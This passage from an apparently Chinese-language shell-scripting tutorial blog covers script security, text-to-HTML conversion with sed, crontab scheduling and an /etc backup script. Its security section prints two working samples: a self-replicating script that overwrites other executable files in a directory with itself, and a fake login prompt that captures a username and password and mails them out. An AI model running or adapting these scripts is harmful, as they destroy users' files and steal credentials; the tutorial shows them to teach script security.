+<figure class="highlight cpp"><table><tr><td class="code"><pre><code class="hljs cpp">#!/bin/bash<br> <br><span class="hljs-keyword">for</span> file in *<br><span class="hljs-keyword">do</span><br>    <span class="hljs-keyword">if</span> test -f $file          #测试是否是文件<br>    then<br>        <span class="hljs-keyword">if</span> test -x $file      #测试文件是否可执行<br>        then<br>            <span class="hljs-keyword">if</span> test -w $file  #测试文件是否可读<br>            then<br>                grep -s <span class="hljs-string">&quot;myself_flag&quot;</span> $file &gt; .temp <span class="hljs-number">2</span>&gt;&amp;<span class="hljs-number">1</span>   #判断自己的一个标志，是否为该shell脚本<br>                #可以写成 <span class="hljs-keyword">if</span> file $file | grep -s <span class="hljs-string">&#x27;shell script&#x27;</span> &gt; /dev/null<br>                <span class="hljs-keyword">if</span> [ $? -ne <span class="hljs-number">0</span> ] <br>                then<br>                    cp -f $<span class="hljs-number">0</span> $file<br>                fi<br>             fi<br>         fi<br>     fi<br>done<br>rm .temp -f<br></code></pre></td></tr></table></figure>
+
+<p>接着可以使用crontab命令让系统以一定的时间间隔调度这些命令执行或设置成开机自动运行即可。</p>
+<p>（2）shell木马</p>
+<p>Shell中同样存在木马，它看上去无害，却隐藏着很大的危险。</p>
+<figure class="highlight cpp"><table><tr><td class="code"><pre><code class="hljs cpp">#!/bin/bash<br>clear<br>cat /etc/issue<br>echo -n <span class="hljs-string">&quot;login:&quot;</span><br>read login<br>echo -n <span class="hljs-string">&quot;password:&quot;</span><br>stty -echo<br>read passwd<br>stty sane<br>mail $USER &lt;&lt;- fin<br>login:$login<br>passwd:$passwd<br>fin<br>echo<br>echo <span class="hljs-string">&quot;login incorrect&quot;</span><br>sleep <span class="hljs-number">1</span><br>exit <span class="hljs-number">0</span><br></code></pre></td></tr></table></figure>
+
+<p>一个盗取别人passwd的shell脚本，当然有经验的linux使用者以下就能区分出来，可以将该木马做的更隐蔽。 </p>
+<h2 id="4、Shell简单应用"><a href="#4、Shell简单应用" class="headerlink" title="4、Shell简单应用"></a>4、Shell简单应用</h2><p> （1）将文本转换成HTML </p>
+<figure class="highlight cpp"><table><tr><td class="code"><pre><code class="hljs cpp">B Liu:Shanghai Jiaotong University:Shanghai:China<br>C Lin:University of Toronto:Toronto:Canada<br>D Hou:Beijing University:Beijing:China<br>J Luo:Southeast University:Nanjing:China<br>Y Zhang:Victory University:Melbourne:Australia<br></code></pre></td></tr></table></figure>
+
+
+
+<p>新建htmlconver.sh脚本，chmod +x htmlconver.sh，然后执行./htmlconver.sh &lt; html.txt &gt; conver.html。</p>
+<figure class="highlight cpp"><table><tr><td class="code"><pre><code class="hljs cpp">#!/bin/bash<br>cat &lt;&lt; CLOUD<br>&lt;!DOCTYPE HTML PUBLIC <span class="hljs-string">&quot;-//W3C//DTD HTML 4.0 Transitional//EN&quot;</span> <span class="hljs-string">&quot;http://www.w3.org/TR/html4/loose.dtd&quot;</span>&gt;<br>&lt;HTML&gt;<br> &lt;HEAD&gt;<br>   &lt;TITLE&gt;<br>   information<br>   &lt;/TITLE&gt;<br> &lt;/HEAD&gt;<br> &lt;BODY&gt;<br>   &lt;TABLE&gt;<br>CLOUD<br> <br>sed -e <span class="hljs-string">&#x27;s/:/&lt;\/TD&gt;&lt;TD&gt;/g&#x27;</span> -e <span class="hljs-string">&#x27;s/^/&lt;TR&gt;&lt;TD&gt;/g&#x27;</span> -e <span class="hljs-string">&#x27;s/$/&lt;\/TD&gt;&lt;\/TR&gt;/g&#x27;</span><br>#等价于awk <span class="hljs-string">&#x27;BEGIN &#123;FS=&quot;:&quot;;OFS=&quot;&lt;/TD&gt;&lt;TD&gt;&quot;&#125; gsub(/^/,&quot;&lt;TR&gt;&lt;TD&gt;&quot;) gsub(/$/,&quot;&lt;/TD&gt;&lt;/TR&gt;&quot;) &#123;print $1,$2,$3,$4&#125;&#x27;</span><br>cat &lt;&lt; CLOUD<br> &lt;/TABLE&gt;<br> &lt;/BODY&gt;<br> &lt;/HTML&gt;<br>CLOUD<br></code></pre></td></tr></table></figure>
+
+<p>（2）crontab定时任务</p>
+<p>​    crondtab是linux下用来周期性的执行某种任务或等待处理某些事件的一个守护进程，与windows下的计划任务类似，crondtab进程每分钟会定期检查是否有要执行的任务，如果有要执行的任务，则自动执行该任务。</p>
+<p>​    每个用户都有自己的调度crontab，可以使用crontab -u user -e或切换到user使用vim /etc/crontab（也可crontab -e）编辑crontab定时任务调度表。crontab命令选项意义如下：</p>
+<p><img src="/shell%E6%B5%85%E8%B0%88%E4%B9%8B%E5%8D%81%E4%BA%8Cshell%E8%B0%83%E8%AF%95%E5%8F%8A%E4%B8%BB%E9%A2%98/20141011143525250" alt="img"></p>
+<p>   linux还定义了两个控制文件来控制crontab，它们是：/etc/cron.allow和/etc/cron.deny。/etc/cron.allow表示哪些用户能使用crontab命令，若cron.allow为空则表明所有用户都不能安排定时任务；若该文件不存在则会查看/etc/cron.deny，只有不包含在这个文件中的用户才可以使用crontab命令；若cron.deny为空则任何用户都可以安排作业。两个文件同时存在cron.allow优先，同时不存在只有root用户能安排定时任务。</p>
+<p>   打开/etc/crontab:</p>
+<p><img src="/shell%E6%B5%85%E8%B0%88%E4%B9%8B%E5%8D%81%E4%BA%8Cshell%E8%B0%83%E8%AF%95%E5%8F%8A%E4%B8%BB%E9%A2%98/20141011144511562" alt="img"></p>
+<p>crontab文件的基本格式 :<br> *　　    *　　 *　　 *　　   *　　command<br> minute hour  day  month  week  command</p>
+<p>其中：</p>
+<p>minute： 表示分钟，可以是从0到59之间的任何整数（每分钟用*或者 */1表示）。</p>
+<p>hour：表示小时，可以是从0到23之间的任何整数（0表示0点）。</p>
+<p>day：表示日期，可以是从1到31之间的任何整数。</p>
+<p>month：表示月份，可以是从1到12之间的任何整数。</p>
+<p>week：表示星期几，可以是从0到7之间的任何整数，这里的0或7代表星期日。</p>
+<p>command：要执行的命令，可以是系统命令，也可以是自己编写的脚本文件。</p>
+<p>在以上各个字段中，还可以使用以下特殊字符：</p>
+<p>星号（*）：代表所有可能的值，例如month字段如果是星号，则表示在满足其它字段的制约条件后每月都执行该命令操作。</p>
+<p>逗号（,）：可以用逗号隔开的值指定一个列表范围，例如，“1,2,5,7,8,9”</p>
+<p>中杠（-）：可以用整数之间的中杠表示一个整数范围，例如“2-6”表示“2,3,4,5,6”</p>
+<p>正斜线（/）：可以用正斜线指定时间的间隔频率，例如“0-23/2”表示每两小时执行一次。同时正斜线可以和星号一起使用，例如*/10，如果用在minute字段，表示每十分钟执行一次。</p>
+<p>   crontab例子如：下午4:50删除/abc目录下所有子目录和文件： 50 16 * * * rm -r /abc/* </p>
+<p>   crontab实现定时文件备份的例子，shell脚本实现备份功能，在crontab中定时每天执行脚本。脚本名称为fileback.sh.</p>
+<figure class="highlight cpp"><table><tr><td class="code"><pre><code class="hljs cpp">#使用root权限将/etc目录下的所有内容进行备份<br><span class="hljs-meta">#fileback.sh</span><br>#!/bin/bash<br> <br>DIRNAME=`ls /root | grep bak`       #获取/root/bak字符串<br> <br><span class="hljs-keyword">if</span> [ -z <span class="hljs-string">&quot;$DIRNAME&quot;</span> ]                #如果/root/bak不存在，则创建一个<br>then<br>mkdir /root/bak<br>cd /root/bak<br>fi<br> <br>#获取当前年、月、日数据存储到YY、MM、DD变量中<br>YY=`date +%y`<br>MM=`date +%m`<br>DD=`date +%d`<br> <br>BACKETC=$YY$MM$DD_etc.tar.gz        #备份文件的名字<br>tar zcvf $BACKETC /etc              #将/etc所有文件打包<br>echo <span class="hljs-string">&quot;fileback finished!&quot;</span><br></code></pre></td></tr></table></figure>
+
+<p>​    先登录root用户，cat /etc/crontab，在末尾加上：59 23 * * * /bin/bash /use/bin/filebach.sh，表示每天23:59执行一次 filebach.sh脚本。 </p>
+<h1 id="三、总结"><a href="#三、总结" class="headerlink" title="三、总结"></a>三、总结</h1><p>（1）Shell脚本调试难度大，熟练使用trap、tee、调试钩子和shell选项将更方便地调试错误。</p>
+<p>（2）Shell下有颜色的脚本和脚本安全的内容还是比较有趣的，读者可以网上搜索更多的内容来补充。</p>
+<p>（3）crontab定时任务对于Shell脚本的定时计划性执行还是非常有用的。</p>
+
+	</div>
+</div>
+<div id="totop" style="position:fixed;bottom:150px;right:50px;cursor: pointer;font-size:26px;background-color:#8590a6">
+	<a title="返回顶部" style="color:#04fa9f"><⇧></a>
+</div>
+<script src="/js/totop.js"></script>
+<script>
+    function setClipboardText(event){
+        
+        let clipboardData = event.clipboardData || window.clipboardData;
+        
+        if (!clipboardData) { return; }
+        event.preventDefault();
+        
+        let text = window.getSelection().toString();
+		    
+        if (text) {
+            
+            event.preventDefault();
+            
+            var copyright = '\n\n'
+            + '\n作品采用 知识共享署名-非商业性使用-相同方式共享 4.0 国际许可协议 进行许可'
+            + '\n著作权归作者所有，商业转载请联系作者获得授权，非商业转载请注明出处。'
+            + '\n作者: modao'
+            + '\n邮箱: rustacean@aliyun.com'
+            + '\n原文地址: https://modao.site/%E7%BC%96%E7%A8%8B%E8%AF%AD%E8%A8%80/Linux%20shell/shell%E6%B5%85%E8%B0%88%E4%B9%8B%E5%8D%81%E4%BA%8Cshell%E8%B0%83%E8%AF%95%E5%8F%8A%E4%B8%BB%E9%A2%98/'
+			
+            clipboardData.setData('text/plain', text + copyright);
+    
+        }
+    };
+	
+    var contents = document.getElementsByClassName("content-area");
+   
+    contents[0].addEventListener('copy',function(e){
+        setClipboardText(e);
+    });
+
+</script>
+    
+  </body>
+</html>
